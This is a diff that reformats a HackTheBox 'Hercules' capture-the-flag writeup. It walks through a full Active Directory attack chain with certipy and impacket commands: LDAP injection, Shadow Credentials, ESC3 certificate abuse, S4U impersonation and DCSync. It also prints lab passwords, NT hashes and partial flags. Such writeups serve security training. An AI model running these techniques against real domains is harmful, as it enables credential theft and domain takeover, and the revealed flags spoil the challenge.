@@ -1,16 +1,56 @@
-# Hercules (HTB) — Full AD Chain Writeup
+<div align="center">
 
-> SEO: HackTheBox Hercules writeup, HackTheBox Hercules walkthrough, HTB Hercules solution, hercules.htb Active Directory exploit chain.
+# Hercules — HackTheBox
 
-> **Target IP used in this run:** `<TARGET_IP>`  
-> **Domain:** `hercules.htb`  
-> **DC Hostname:** `dc.hercules.htb`
+![Difficulty](https://img.shields.io/badge/Difficulty-Insane-purple?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-## 1) Scope & Summary
+</div>
 
-Hercules is a deep Windows AD chain:
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Hercules |
+| IP | `<TARGET_IP>` |
+| OS | Windows |
+| Difficulty | Insane |
+| Hostname | hercules.htb |
+
+## Table of Contents
+
+1. [Scope and Summary](#scope-and-summary)
+2. [Initial Setup](#initial-setup)
+3. [Web and LDAP Phase](#web-and-ldap-phase)
+4. [Credential Pivot to natalie.a](#credential-pivot-to-nataliea)
+5. [Shadow Credentials to bob.w](#shadow-credentials-to-bobw)
+6. [Object Move and Shadow to auditor](#object-move-and-shadow-to-auditor)
+7. [User Flag](#user-flag)
+8. [Forest Migration Control and fernando.r](#forest-migration-control-and-fernandor)
+9. [ESC3 Enrollment Agent Abuse](#esc3-enrollment-agent-abuse)
+10. [IIS_Administrator Timing Window](#iis_administrator-timing-window)
+11. [IIS_Webserver Chain and U2U/S4U Trick](#iis_webserver-chain-and-u2us4u-trick)
+12. [DCSync and Administrator Ticket](#dcsync-and-administrator-ticket)
+13. [Root Flag](#root-flag)
+14. [Notes and Lessons](#notes-and-lessons)
+15. [Flags](#flags)
+
+---
+
+## Scope and Summary
+
+Hercules is a deep Windows Active Directory chain:
 
 1. LDAP injection on web login to recover reused creds
 2. Shadow Credentials pivot to privileged identities
@@ -19,11 +59,11 @@ Hercules is a deep Windows AD chain:
 5. Service-account chain + U2U/S4U trick
 6. DCSync and final Administrator access
 
-This writeup reflects a **working run** against `<TARGET_IP>`, including timing constraints from the periodic reset/cleanup behavior.
+This writeup reflects a working run against `<TARGET_IP>`, including timing constraints from the periodic reset/cleanup behavior.
 
 ---
 
-## 2) Initial setup
+## Initial Setup
 
 ```bash
 echo "<TARGET_IP> dc.hercules.htb hercules.htb" | sudo tee -a /etc/hosts
@@ -52,24 +92,31 @@ Recommended Kerberos config for this target:
 
 ---
 
-## 3) Web/LDAP phase
+## Web and LDAP Phase
 
-- LDAP filter injection in login flow was used to enumerate users and extract sensitive `description` data.
-- Recovered reused password pattern:
+LDAP filter injection in the login flow was used to enumerate users and extract sensitive `description` data.
 
-`change*th1s_p@ssw()rd!!`
+Recovered reused password pattern:
 
-- Valid account reused in chain:
+```
+change*th1s_p@ssw()rd!!
+```
 
-`ken.w : change*th1s_p@ssw()rd!!`
+Valid account reused in chain:
+
+```
+ken.w : change*th1s_p@ssw()rd!!
+```
 
 ---
 
-## 4) Credential pivot to `natalie.a`
+## Credential Pivot to natalie.a
 
-Via the web-admin/document workflow chain (cookie + Bad-ODF + NetNTLMv2 capture/crack path), we used:
+Via the web-admin/document workflow chain (cookie + Bad-ODF + NetNTLMv2 capture/crack path), the following credentials were obtained:
 
-`natalie.a : Prettyprincess123!`
+```
+natalie.a : Prettyprincess123!
+```
 
 Then:
 
@@ -79,7 +126,7 @@ getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip <TARGET_IP>
 
 ---
 
-## 5) Shadow Credentials to `bob.w`
+## Shadow Credentials to bob.w
 
 ```bash
 export KRB5CCNAME=$(pwd)/natalie.a.ccache
@@ -90,11 +137,13 @@ certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
 
 Result included `bob.w.ccache` and NT hash:
 
-`bob.w : 8a65c74e8f0073babbfac6725c66cc3f`
+```
+bob.w : 8a65c74e8f0073babbfac6725c66cc3f
+```
 
 ---
 
-## 6) Object move + Shadow to `auditor`
+## Object Move and Shadow to auditor
 
 Move object as required by ACL model:
 
@@ -114,11 +163,13 @@ certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
 
 Resulting NT hash:
 
-`auditor : a9285c625af80519ad784729655ff325`
+```
+auditor : a9285c625af80519ad784729655ff325
+```
 
 ---
 
-## 7) User flag
+## User Flag
 
 Kerberos WinRM as `auditor`:
 
@@ -129,13 +180,9 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
   hercules.htb/auditor@dc.hercules.htb
 ```
 
-**user.txt:**
-
-`30a01498710660e5████████████████`
-
 ---
 
-## 8) Forest Migration control + `fernando.r`
+## Forest Migration Control and fernando.r
 
 Grant control repeatedly (reset task may revert):
 
@@ -155,9 +202,9 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
 
 ---
 
-## 9) ESC3 (critical fix: use DCOM)
+## ESC3 Enrollment Agent Abuse
 
-### 9.1 Enrollment Agent cert
+### Enrollment Agent Certificate
 
 ```bash
 getTGT.py 'HERCULES.HTB/fernando.r:NewPass123!' -dc-ip <TARGET_IP>
@@ -169,7 +216,7 @@ certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
   -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom -out fernando_ea2
 ```
 
-### 9.2 On-behalf cert for `ashley.b` (DCOM)
+### On-Behalf Certificate for ashley.b (DCOM)
 
 ```bash
 certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
@@ -181,7 +228,7 @@ certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
 
 This produced `ashley.b.pfx` successfully (the major blocker in many runs if using RPC instead of DCOM).
 
-### 9.3 Authenticate as `ashley.b`
+### Authenticate as ashley.b
 
 ```bash
 rm -f ashley.b.ccache
@@ -190,21 +237,21 @@ certipy auth -pfx ashley.b.pfx -dc-ip <TARGET_IP> -no-hash
 
 ---
 
-## 10) IIS_Administrator timing window (reset-aware)
+## IIS_Administrator Timing Window
 
 This target has periodic cleanup/reset behavior. Reliable path:
 
 1. Run `aCleanup.ps1` as `ashley.b`
-2. Wait ~22–25s
+2. Wait ~22-25s
 3. Re-apply GenericAll on Forest Migration (`IT SUPPORT` and `Auditor`)
 4. Rapidly attempt:
-   - remove `ACCOUNTDISABLE` from `IIS_Administrator`
-   - reset `IIS_Administrator` password
+   - Remove `ACCOUNTDISABLE` from `IIS_Administrator`
+   - Reset `IIS_Administrator` password
 
 Once the window hit:
 
 - `IIS_Administrator` became enabled
-- password set to `Passw0rd@123`
+- Password set to `Passw0rd@123`
 
 Then:
 
@@ -214,7 +261,7 @@ getTGT.py 'HERCULES.HTB/IIS_Administrator:Passw0rd@123' -dc-ip <TARGET_IP>
 
 ---
 
-## 11) IIS_Webserver$ chain + U2U/S4U trick
+## IIS_Webserver Chain and U2U/S4U Trick
 
 Reset service-account password from `IIS_Administrator` context:
 
@@ -251,11 +298,13 @@ getST.py -spn 'cifs/dc.hercules.htb' -impersonate Administrator \
 
 Output:
 
-`Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache`
+```
+Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+```
 
 ---
 
-## 12) DCSync + Administrator ticket
+## DCSync and Administrator Ticket
 
 ```bash
 export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
@@ -264,7 +313,9 @@ secretsdump.py -k -no-pass dc.hercules.htb -dc-ip <TARGET_IP> -just-dc-user admi
 
 Recovered Administrator NT hash:
 
-`56855ee6b7570edefde6ac262200756e`
+```
+56855ee6b7570edefde6ac262200756e
+```
 
 Then:
 
@@ -274,7 +325,7 @@ getTGT.py 'HERCULES.HTB/Administrator' -hashes ':56855ee6b7570edefde6ac262200756
 
 ---
 
-## 13) Root flag
+## Root Flag
 
 ```bash
 export KRB5CCNAME=$(pwd)/Administrator.ccache
@@ -283,21 +334,31 @@ python3 winrmexec.py -ssl -port 5986 -k -no-pass \
   hercules.htb/administrator@dc.hercules.htb
 ```
 
-**root.txt:**
+---
 
-`4bb7856e2706b719████████████████`
+## Notes and Lessons
+
+- On this host, ESC3 via Certipy should use `-dcom` when RPC retrieval paths are unstable.
+- Cleanup/reset timing is decisive; scripting the race loop is far more reliable than manual execution.
+- For the IIS service-account stage, the session-key == NT-hash alignment is mandatory for successful U2U+S4U chaining in this setup.
 
 ---
 
-## Notes / Lessons
+## Flags
 
-- On this host, **ESC3 via Certipy should use `-dcom`** when RPC retrieval paths are unstable.
-- Cleanup/reset timing is decisive; scripting the race loop is far more reliable than manual clicks.
-- For the IIS service-account stage, the **session-key == NT-hash** alignment is mandatory for successful U2U+S4U chaining in this setup.
+| Flag | Value |
+|------|-------|
+| User | `30a01498710660e5████████████████` |
+| Root | `4bb7856e2706b719████████████████` |
 
 ---
 
-## Final Flags (this run)
+<div align="center">
 
-- `user.txt`: `30a01498710660e5████████████████`
-- `root.txt`: `4bb7856e2706b719████████████████`
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Hercules*
+
+</div>
